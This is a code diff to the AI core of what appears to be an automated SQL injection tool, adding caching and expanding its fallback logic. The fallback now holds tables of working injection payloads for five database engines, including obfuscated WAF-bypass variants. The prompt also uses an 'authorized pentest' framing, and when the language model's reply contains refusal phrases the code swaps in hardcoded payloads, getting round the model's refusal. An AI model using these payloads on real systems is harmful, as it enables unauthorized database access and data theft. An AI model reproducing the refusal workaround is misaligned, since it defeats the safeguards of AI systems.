@@ -1,5 +1,7 @@
 import os
 import json
+import time
+import hashlib
 import requests
 from openai import OpenAI
 from lib.core.data import logger
@@ -16,6 +18,16 @@ class AICore:
         """
         self.config = load_config()
         self.client = None
+        self.cache = {}
+        self.cache_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cache")
+        
+        # 确保缓存目录存在
+        if not os.path.exists(self.cache_dir):
+            try:
+                os.makedirs(self.cache_dir)
+            except Exception as e:
+                logger.warning(f"无法创建缓存目录: {e}")
+        
         self._init_openai_client()
     
     def _init_openai_client(self):
@@ -46,6 +58,51 @@ class AICore:
         except Exception as e:
             logger.error(f"初始化OpenAI客户端失败: {e}")
     
+    def _load_cache(self):
+        """加载缓存"""
+        try:
+            cache_file = os.path.join(self.cache_dir, "ai_cache.json")
+            if os.path.exists(cache_file):
+                with open(cache_file, 'r', encoding='utf-8') as f:
+                    cache_data = json.load(f)
+                    
+                    # 检查缓存是否过期
+                    current_time = time.time()
+                    cache_expiry = int(self.config.get('CACHE', {}).get('expiry_days', 7)) * 86400  # 默认7天
+                    
+                    # 过滤掉过期的缓存
+                    self.cache = {}
+                    for k, v in cache_data.items():
+                        if isinstance(v, dict) and ('timestamp' not in v or current_time - v['timestamp'] < cache_expiry):
+                            self.cache[k] = v
+                    
+                    # 如果有过期项目被移除，保存更新后的缓存
+                    if len(self.cache) < len(cache_data):
+                        self._save_cache()
+                        
+                    logger.info(f"已加载 {len(self.cache)} 个缓存项")
+        except Exception as e:
+            logger.warning(f"加载缓存失败: {e}")
+            self.cache = {}  # 确保缓存是一个空字典
+    
+    def _save_cache(self):
+        """保存缓存"""
+        try:
+            cache_file = os.path.join(self.cache_dir, "ai_cache.json")
+            with open(cache_file, 'w', encoding='utf-8') as f:
+                json.dump(self.cache, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            logger.warning(f"保存缓存失败: {e}")
+    
+    def _get_cache_key(self, method, *args):
+        """生成缓存键"""
+        # 将参数转换为字符串
+        args_str = str(args)
+        
+        # 生成哈希值作为缓存键
+        key = f"{method}:{args_str}"
+        return hashlib.md5(key.encode()).hexdigest()
+    
     def is_api_key_valid(self):
         """
         检查API密钥是否有效
@@ -66,6 +123,14 @@ class AICore:
         返回:
             str: 生成的payload
         """
+        # 生成缓存键
+        cache_key = f"payload_{dbms}_{injection_type}_waf{waf}_level{level}"
+        
+        # 检查内存缓存
+        if cache_key in self.cache:
+            logger.info("使用缓存的payload")
+            return self.cache[cache_key]
+        
         # 构建提示词
         prompt = f"""
 你是一个安全研究人员，正在进行授权的渗透测试。请生成一个针对{dbms}数据库的{injection_type}类型SQL注入payload，用于安全测试目的。
@@ -131,7 +196,10 @@ class AICore:
             
             if any(phrase in payload.lower() for phrase in rejection_phrases):
                 logger.warning("AI拒绝生成payload，使用备用方法")
-                return self._generate_fallback_payload(dbms, injection_type, waf)
+                payload = self._generate_fallback_payload(dbms, injection_type, waf)
+            
+            # 缓存结果
+            self.cache[cache_key] = payload
             
             return payload
         except Exception as e:
@@ -143,24 +211,96 @@ class AICore:
         """
         生成备用payload（当API调用失败时）
         """
-        if dbms.lower() == 'mysql':
-            if injection_type.lower() == 'union':
-                return "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- -" if not waf else "/*!50000'*/ /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5,6,7,8,9,10 -- -"
-            elif injection_type.lower() == 'error':
-                return "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -"
-            elif injection_type.lower() == 'boolean':
-                return "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='a' -- -"
-            elif injection_type.lower() == 'time':
-                return "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -"
-        elif dbms.lower() == 'postgresql':
-            if injection_type.lower() == 'union':
-                return "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -"
-            elif injection_type.lower() == 'error':
-                return "' AND 1=cast((SELECT version()) as int) -- -"
-            elif injection_type.lower() == 'boolean':
-                return "' AND (SELECT ascii(substring(current_database(),1,1)))=100 -- -"
-            elif injection_type.lower() == 'time':
-                return "' AND (SELECT pg_sleep(5)) -- -"
+        # 标准payload
+        standard_payloads = {
+            "mysql": {
+                "union": "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- -",
+                "error": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -",
+                "boolean": "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='a' -- -",
+                "time": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -"
+            },
+            "postgresql": {
+                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -",
+                "error": "' AND 1=cast((SELECT version()) as int) -- -",
+                "boolean": "' AND (SELECT ascii(substring(current_database(),1,1)))=100 -- -",
+                "time": "' AND (SELECT pg_sleep(5)) -- -"
+            },
+            "oracle": {
+                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM DUAL -- -",
+                "error": "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||USER||CHR(62))) FROM dual) -- -",
+                "boolean": "' AND (SELECT ascii(substr(username,1,1)) FROM all_users WHERE rownum=1)=65 -- -",
+                "time": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) -- -"
+            },
+            "mssql": {
+                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -",
+                "error": "' AND 1=convert(int,(SELECT @@version)) -- -",
+                "boolean": "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))=65 -- -",
+                "time": "'; WAITFOR DELAY '0:0:5' -- -"
+            },
+            "sqlite": {
+                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -",
+                "error": "' AND 1=CAST((SELECT sqlite_version()) AS INT) -- -",
+                "boolean": "' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1))=65) THEN 1 ELSE 0 END) -- -",
+                "time": "' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) -- -"
+            },
+            "generic": {
+                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -",
+                "error": "' AND 1=@@version -- -",
+                "boolean": "' AND 1=1 -- -",
+                "time": "' AND SLEEP(5) -- -"
+            }
+        }
+        
+        # WAF绕过payload
+        waf_payloads = {
+            "mysql": {
+                "union": "/*!50000'*/ /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5,6,7,8,9,10 -- -",
+                "error": "'+/*!50000AnD*/+/*!50000(*/+/*!50000SeLeCt*/+1+/*!50000FrOm*/+(/*!50000SeLeCt*/+/*!50000CoUnT*/(*),/*!50000CoNcAt*/(0x3a,/*!50000UsEr*/(),0x3a,/*!50000FlOoR*/(/*!50000RaNd*/(0)*2))x+/*!50000FrOm*/+/*!50000InFoRmAtIoN_ScHeMa*/./*!50000TaBlEs*/+/*!50000GrOuP*/+/*!50000By*/+x)a+/*!50000AnD*/+'1'='1",
+                "boolean": "'+/*!50000AnD*/+(/*!50000SeLeCt*/+/*!50000SuBsTrInG*/(/*!50000TaBlE_NaMe*/,1,1)+/*!50000FrOm*/+/*!50000InFoRmAtIoN_ScHeMa*/./*!50000TaBlEs*/+/*!50000WhErE*/+/*!50000TaBlE_ScHeMa*/=/*!50000DaTaBaSe*/()/*!50000LiMiT*/+0,1)='a'+/*!50000AnD*/+'1'='1",
+                "time": "'+/*!50000AnD*/+(/*!50000SeLeCt*/+*+/*!50000FrOm*/+(/*!50000SeLeCt*/(/*!50000SlEeP*/(5)))a)+/*!50000AnD*/+'1'='1"
+            },
+            "postgresql": {
+                "union": "' /**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL,NULL,NULL-- -",
+                "error": "' AND/**/1=CAST((CHR(65)||CHR(66)||CHR(67)) AS/**/INTEGER)-- -",
+                "boolean": "' AND/**/(SELECT/**/ASCII(SUBSTRING((SELECT/**/current_database()),1,1)))=100-- -",
+                "time": "' AND/**/(SELECT/**/PG_SLEEP(5))-- -"
+            },
+            "oracle": {
+                "union": "' UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL/**/FROM/**/DUAL-- -",
+                "error": "' AND/**/1=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||USER||CHR(62)))/**/FROM/**/dual)-- -",
+                "boolean": "' AND/**/(SELECT/**/ASCII(SUBSTR(USERNAME,1,1))/**/FROM/**/ALL_USERS/**/WHERE/**/ROWNUM=1)=65-- -",
+                "time": "' AND/**/1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(68)||CHR(83),5)-- -"
+            },
+            "mssql": {
+                "union": "' UNION%09SELECT%09NULL,NULL,NULL,NULL,NULL-- -",
+                "error": "' AND%091=convert(int,(SELECT%09@@version))-- -",
+                "boolean": "' AND%09ASCII(SUBSTRING((SELECT%09TOP%091%09name%09FROM%09sysobjects),1,1))=65-- -",
+                "time": "';%09WAITFOR%09DELAY%09'0:0:5'-- -"
+            },
+            "sqlite": {
+                "union": "' UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL-- -",
+                "error": "' AND/**/1=CAST((SELECT/**/sqlite_version())/**/AS/**/INT)-- -",
+                "boolean": "' AND/**/(SELECT/**/CASE/**/WHEN/**/(ASCII(SUBSTR((SELECT/**/name/**/FROM/**/sqlite_master/**/LIMIT/**/1),1,1))=65)/**/THEN/**/1/**/ELSE/**/0/**/END)-- -",
+                "time": "' AND/**/(SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/randomblob(100000000)/**/ELSE/**/1/**/END)-- -"
+            },
+            "generic": {
+                "union": "'+/*!UnIoN*/+/*!SeLeCt*/+NULL,NULL,NULL,NULL,NULL--+-",
+                "error": "'+/*!AnD*/+1=@@version--+-",
+                "boolean": "'+/*!AnD*/+1=1--+-",
+                "time": "'+/*!AnD*/+/*!SlEeP*/(5)--+-"
+            }
+        }
+        
+        # 选择合适的payload集合
+        payload_set = waf_payloads if waf else standard_payloads
+        
+        # 尝试获取指定数据库和注入类型的payload
+        if dbms.lower() in payload_set and injection_type.lower() in payload_set[dbms.lower()]:
+            return payload_set[dbms.lower()][injection_type.lower()]
+        
+        # 如果找不到指定的数据库类型，尝试使用通用payload
+        if injection_type.lower() in payload_set["generic"]:
+            return payload_set["generic"][injection_type.lower()]
         
         # 默认返回一个通用的payload
         return "' OR '1'='1"
@@ -175,6 +315,14 @@ class AICore:
         返回:
             str: 分析结果
         """
+        # 生成缓存键
+        cache_key = f"analyze_{hashlib.md5(results.encode()).hexdigest()}"
+        
+        # 检查内存缓存
+        if cache_key in self.cache:
+            logger.info("使用缓存的分析结果")
+            return self.cache[cache_key]
+        
         if not self.client:
             self._init_openai_client()
             if not self.client:
@@ -222,7 +370,10 @@ class AICore:
                 
                 if any(phrase in analysis.lower() for phrase in rejection_phrases):
                     logger.warning("AI拒绝分析结果，使用备用分析")
-                    return "扫描发现了SQL注入漏洞。这是一个高风险漏洞，可能允许攻击者未经授权访问或修改数据库中的数据。建议立即修复此漏洞。"
+                    analysis = "扫描发现了SQL注入漏洞。这是一个高风险漏洞，可能允许攻击者未经授权访问或修改数据库中的数据。建议立即修复此漏洞。"
+                
+                # 缓存结果
+                self.cache[cache_key] = analysis
                 
                 return analysis
             else:
@@ -242,6 +393,14 @@ class AICore:
         返回:
             str: 漏洞解释
         """
+        # 生成缓存键
+        cache_key = f"explain_{hashlib.md5(vuln_type.encode()).hexdigest()}"
+        
+        # 检查内存缓存
+        if cache_key in self.cache:
+            logger.info("使用缓存的漏洞解释")
+            return self.cache[cache_key]
+        
         if not self.client:
             self._init_openai_client()
             if not self.client:
@@ -288,7 +447,10 @@ class AICore:
                 
                 if any(phrase in explanation.lower() for phrase in rejection_phrases):
                     logger.warning("AI拒绝提供漏洞解释，使用备用解释")
-                    return "SQL注入是一种常见的Web应用程序漏洞，允许攻击者通过操纵输入来修改后端SQL查询。这可能导致未授权访问数据库、数据泄露或数据损坏。"
+                    explanation = "SQL注入是一种常见的Web应用程序漏洞，允许攻击者通过操纵输入来修改后端SQL查询。这可能导致未授权访问数据库、数据泄露或数据损坏。"
+                
+                # 缓存结果
+                self.cache[cache_key] = explanation
                 
                 return explanation
             else:
@@ -308,6 +470,14 @@ class AICore:
         返回:
             str: 修复建议
         """
+        # 生成缓存键
+        cache_key = f"fix_{hashlib.md5(vuln_description.encode()).hexdigest()}"
+        
+        # 检查内存缓存
+        if cache_key in self.cache:
+            logger.info("使用缓存的修复建议")
+            return self.cache[cache_key]
+        
         if not self.client:
             self._init_openai_client()
             if not self.client:
@@ -354,7 +524,10 @@ class AICore:
                 
                 if any(phrase in fix.lower() for phrase in rejection_phrases):
                     logger.warning("AI拒绝提供修复建议，使用备用建议")
-                    return "修复SQL注入漏洞的最佳方法是使用参数化查询或预处理语句，避免直接拼接SQL语句。同时，实施输入验证、最小权限原则和WAF保护也是重要的防御措施。"
+                    fix = "修复SQL注入漏洞的最佳方法是使用参数化查询或预处理语句，避免直接拼接SQL语句。同时，实施输入验证、最小权限原则和WAF保护也是重要的防御措施。"
+                
+                # 缓存结果
+                self.cache[cache_key] = fix
                 
                 return fix
             else:
